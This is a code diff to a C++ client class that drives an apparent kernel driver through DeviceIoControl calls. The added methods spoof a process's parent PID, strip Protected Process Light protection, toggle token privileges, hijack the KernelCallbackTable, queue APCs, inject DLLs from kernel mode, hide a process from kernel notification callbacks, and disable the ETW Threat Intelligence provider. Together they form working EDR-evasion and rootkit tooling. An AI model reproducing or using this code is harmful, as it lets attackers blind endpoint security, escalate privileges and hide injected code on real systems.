@@ -462,10 +462,10 @@ public:
 
 	///-------------------------------------------------------------------------------------------------
 	/// <summary>Enumerates registered kernel notification callbacks (process, thread,
-	///          or image load).</summary>
+	///          image load, or registry).</summary>
 	///
 	/// <param name="type">CALLBACK_TYPE_PROCESS (0), CALLBACK_TYPE_THREAD (1),
-	///                     or CALLBACK_TYPE_IMAGE (2).</param>
+	///                     CALLBACK_TYPE_IMAGE (2), or CALLBACK_TYPE_REGISTRY (3).</param>
 	///
 	/// <returns>Vector of callback_info on success, std::nullopt on failure.</returns>
 	///-------------------------------------------------------------------------------------------------
@@ -514,7 +514,7 @@ public:
 	///          Use enum_callbacks() first to discover the index.</summary>
 	///
 	/// <param name="type">CALLBACK_TYPE_PROCESS (0), CALLBACK_TYPE_THREAD (1),
-	///                     or CALLBACK_TYPE_IMAGE (2).</param>
+	///                     CALLBACK_TYPE_IMAGE (2), or CALLBACK_TYPE_REGISTRY (3).</param>
 	/// <param name="index">The array index of the callback to remove.</param>
 	///
 	/// <returns>True if the callback was successfully removed, false otherwise.</returns>
@@ -550,7 +550,7 @@ public:
 	/// <summary>Removes all registered callbacks of a given type.</summary>
 	///
 	/// <param name="type">CALLBACK_TYPE_PROCESS (0), CALLBACK_TYPE_THREAD (1),
-	///                     or CALLBACK_TYPE_IMAGE (2).</param>
+	///                     CALLBACK_TYPE_IMAGE (2), or CALLBACK_TYPE_REGISTRY (3).</param>
 	///
 	/// <returns>Number of callbacks removed on success, std::nullopt on failure.</returns>
 	///-------------------------------------------------------------------------------------------------
@@ -665,6 +665,386 @@ public:
 		}
 
 		return result;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Spoofs the parent PID of a target process by overwriting
+	///          EPROCESS.InheritedFromUniqueProcessId.</summary>
+	///
+	/// <param name="pid">The target process ID.</param>
+	/// <param name="new_parent_pid">The PID to set as the new parent.</param>
+	///
+	/// <returns>The previous parent PID on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > spoof_parent_pid( DWORD pid, ULONG64 new_parent_pid )
+	{
+		if( !is_connected() )
+			return std::nullopt;
+
+		PROCESS_TAMPER_REQUEST request = {};
+		request.SubCommand = TAMPER_SPOOF_PPID;
+		request.ProcessId  = static_cast< ULONG64 >( pid );
+		request.Params.SpoofPpid.NewParentPid = new_parent_pid;
+
+		PROCESS_TAMPER_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_PROCESS_TAMPER,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.PreviousValue;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Removes Protected Process Light (PPL) restrictions from a process
+	///          by zeroing the PS_PROTECTION byte in EPROCESS.</summary>
+	///
+	/// <param name="pid">The target process ID.</param>
+	///
+	/// <returns>The previous protection value on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > bypass_ppl( DWORD pid )
+	{
+		if( !is_connected() )
+			return std::nullopt;
+
+		PROCESS_TAMPER_REQUEST request = {};
+		request.SubCommand = TAMPER_BYPASS_PPL;
+		request.ProcessId  = static_cast< ULONG64 >( pid );
+
+		PROCESS_TAMPER_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_PROCESS_TAMPER,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.PreviousValue;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Enables or disables a specific privilege in the process token.</summary>
+	///
+	/// <param name="pid">The target process ID.</param>
+	/// <param name="privilege_luid">The LUID of the privilege (e.g. SE_DEBUG_PRIVILEGE = 20).</param>
+	/// <param name="enable">True to enable, false to disable.</param>
+	///
+	/// <returns>The previous privilege state on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > toggle_privilege( DWORD pid, ULONG64 privilege_luid, bool enable )
+	{
+		if( !is_connected() )
+			return std::nullopt;
+
+		PROCESS_TAMPER_REQUEST request = {};
+		request.SubCommand = TAMPER_TOGGLE_PRIVILEGE;
+		request.ProcessId  = static_cast< ULONG64 >( pid );
+		request.Params.TogglePrivilege.PrivilegeLuid = privilege_luid;
+		request.Params.TogglePrivilege.Enable = enable ? 1 : 0;
+
+		PROCESS_TAMPER_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_PROCESS_TAMPER,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.PreviousValue;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Overwrites an entry in the target process's PEB KernelCallbackTable.</summary>
+	///
+	/// <param name="pid">The target process ID.</param>
+	/// <param name="table_index">The index in the KernelCallbackTable to overwrite.</param>
+	/// <param name="new_function">The user-mode address to redirect to.</param>
+	///
+	/// <returns>The previous function pointer on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > hijack_callback_table( DWORD pid, ULONG table_index, ULONG64 new_function )
+	{
+		if( !is_connected() )
+			return std::nullopt;
+
+		INJECT_REQUEST request = {};
+		request.SubCommand = INJECT_CALLBACK_TABLE;
+		request.ProcessId  = static_cast< ULONG64 >( pid );
+		request.Params.CallbackTable.TableIndex  = table_index;
+		request.Params.CallbackTable.NewFunction = new_function;
+
+		INJECT_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_INJECT,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.PreviousValue;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Queues a user-mode APC to a thread in the target process.</summary>
+	///
+	/// <param name="pid">The process ID owning the target thread.</param>
+	/// <param name="thread_id">The thread ID to queue the APC on.</param>
+	/// <param name="apc_routine">The user-mode address to execute when the APC fires.</param>
+	/// <param name="apc_argument">The argument to pass to the APC routine.</param>
+	///
+	/// <returns>True if the APC was queued, false otherwise.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] bool queue_kernel_apc( DWORD pid, ULONG64 thread_id, ULONG64 apc_routine, ULONG64 apc_argument )
+	{
+		if( !is_connected() )
+			return false;
+
+		INJECT_REQUEST request = {};
+		request.SubCommand = INJECT_KERNEL_APC;
+		request.ProcessId  = static_cast< ULONG64 >( pid );
+		request.Params.KernelApc.ThreadId    = thread_id;
+		request.Params.KernelApc.ApcRoutine  = apc_routine;
+		request.Params.KernelApc.ApcArgument = apc_argument;
+
+		INJECT_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_INJECT,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		return success && response.Status == 0;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Injects a DLL into the target process from kernel mode.</summary>
+	///
+	/// <param name="pid">The target process ID.</param>
+	/// <param name="dll_path">Full path to the DLL to inject.</param>
+	///
+	/// <returns>The allocated buffer address on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > inject_dll( DWORD pid, const std::wstring& dll_path )
+	{
+		if( !is_connected() || dll_path.empty() )
+			return std::nullopt;
+
+		INJECT_REQUEST request = {};
+		request.SubCommand = INJECT_DLL;
+		request.ProcessId  = static_cast< ULONG64 >( pid );
+
+		const auto copy_len = min( dll_path.size(), MAX_MODULE_NAME_LENGTH - 1 );
+		memcpy( request.Params.DllInject.DllPath, dll_path.c_str(), copy_len * sizeof( WCHAR ) );
+		request.Params.DllInject.DllPath[copy_len] = L'\0';
+
+		INJECT_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_INJECT,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.AllocatedAddress;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Redirects Ps*Notify callbacks to a filter that hides a specific PID.</summary>
+	///
+	/// <param name="hidden_pid">The process ID to hide from callback consumers.</param>
+	///
+	/// <returns>Number of redirected callbacks on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > redirect_callbacks( DWORD hidden_pid )
+	{
+		if( !is_connected() )
+			return std::nullopt;
+
+		SUPPRESS_TELEMETRY_REQUEST request = {};
+		request.SubCommand = SUPPRESS_REDIRECT_CALLBACKS;
+		request.Enable     = 1;
+		request.ProcessId  = static_cast< ULONG64 >( hidden_pid );
+
+		SUPPRESS_TELEMETRY_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_SUPPRESS_TELEMETRY,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.PreviousValue;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Restores all previously redirected Ps*Notify callbacks.</summary>
+	///
+	/// <returns>True if callbacks were restored, false otherwise.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] bool restore_callbacks()
+	{
+		if( !is_connected() )
+			return false;
+
+		SUPPRESS_TELEMETRY_REQUEST request = {};
+		request.SubCommand = SUPPRESS_REDIRECT_CALLBACKS;
+		request.Enable     = 0;
+
+		SUPPRESS_TELEMETRY_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_SUPPRESS_TELEMETRY,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		return success && response.Status == 0;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Disables the ETW Threat Intelligence provider by zeroing its
+	///          ProviderEnableInfo field.</summary>
+	///
+	/// <returns>The previous enable value on success, std::nullopt on failure.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] std::optional< ULONG64 > suppress_etw_ti()
+	{
+		if( !is_connected() )
+			return std::nullopt;
+
+		SUPPRESS_TELEMETRY_REQUEST request = {};
+		request.SubCommand = SUPPRESS_ETW_TI;
+		request.Enable     = 1;
+
+		SUPPRESS_TELEMETRY_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_SUPPRESS_TELEMETRY,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		if( !success || response.Status != 0 )
+			return std::nullopt;
+
+		return response.PreviousValue;
+	}
+
+	///-------------------------------------------------------------------------------------------------
+	/// <summary>Restores the ETW Threat Intelligence provider to its original state.</summary>
+	///
+	/// <returns>True if the provider was restored, false otherwise.</returns>
+	///-------------------------------------------------------------------------------------------------
+
+	[[nodiscard]] bool restore_etw_ti()
+	{
+		if( !is_connected() )
+			return false;
+
+		SUPPRESS_TELEMETRY_REQUEST request = {};
+		request.SubCommand = SUPPRESS_ETW_TI;
+		request.Enable     = 0;
+
+		SUPPRESS_TELEMETRY_RESPONSE response = {};
+		DWORD bytes_returned = 0;
+
+		const auto success = DeviceIoControl(
+			m_handle.get(),
+			IOCTL_SUPPRESS_TELEMETRY,
+			&request,
+			sizeof( request ),
+			&response,
+			sizeof( response ),
+			&bytes_returned,
+			nullptr
+		);
+
+		return success && response.Status == 0;
 	}
 
 private:
